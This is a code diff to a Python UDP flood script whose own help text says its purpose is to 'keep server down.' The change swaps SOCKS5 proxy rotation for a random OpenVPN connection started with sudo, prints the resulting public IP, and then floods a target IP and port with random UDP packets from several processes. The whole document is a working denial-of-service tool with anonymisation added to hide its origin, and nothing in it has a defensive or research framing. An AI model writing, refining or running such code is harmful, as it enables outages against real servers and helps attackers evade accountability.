@@ -4,34 +4,8 @@ import threading
 import time
 import argparse
 import os
+import subprocess
 import random
-import socks
-
-PROXY_FILE = "proxies.txt"
-
-def load_proxies():
-    """Load proxies from the proxy file."""
-    proxies = []
-    with open(PROXY_FILE, 'r') as f:
-        for line in f:
-            proxies.append(line.strip())
-    return proxies
-
-def select_random_proxy(proxies):
-    """Select a random proxy from the list of proxies."""
-    return random.choice(proxies)
-
-def setup_proxy(proxy):
-    """Setup the SOCKS5 proxy based on the proxy details."""
-    proxy_parts = proxy.split(":")
-    proxy_host = proxy_parts[0]
-    proxy_port = int(proxy_parts[1])
-    proxy_user = proxy_parts[2]
-    proxy_pass = proxy_parts[3]
-
-    # Configure the SOCKS5 proxy
-    socks.set_default_proxy(socks.SOCKS5, proxy_host, proxy_port, True, proxy_user, proxy_pass)
-    socket.socket = socks.socksocket
 
 def generate_random_payload():
     return os.urandom(20)
@@ -68,6 +42,16 @@ def udp_flood(target_ip, target_port, duration):
     for process in processes:
         process.join()
 
+def connect_random_vpn():
+    vpn_files = [f for f in os.listdir('proxy') if f.endswith('.ovpn')]
+    random_vpn_file = random.choice(vpn_files)
+    vpn_process = subprocess.Popen(['sudo', 'openvpn', '--config', f'proxy/{random_vpn_file}'])
+    return vpn_process
+
+def show_current_ip():
+    result = subprocess.run(['curl', 'ifconfig.me'], capture_output=True, text=True)
+    print(f"Current public IP: {result.stdout.strip()}")
+
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="High-intensity UDP flood script to keep server down.")
     parser.add_argument('target_ip', help="Target IP address.")
@@ -76,14 +60,12 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
-    # Load proxies and select one randomly
-    proxies = load_proxies()
-    random_proxy = select_random_proxy(proxies)
+    vpn = connect_random_vpn()
 
-    print(f"Using random proxy: {random_proxy}")
-    setup_proxy(random_proxy)
+    time.sleep(10)  # Adjust based on VPN connection time
 
-    print(f"Starting UDP flood on {args.target_ip}:{args.target_port} for {args.duration} seconds with 90% CPU usage.")
+    show_current_ip()
+
     udp_flood(args.target_ip, args.target_port, args.duration)
-    print("UDP flood completed.")
-  
+
+    vpn.terminate()
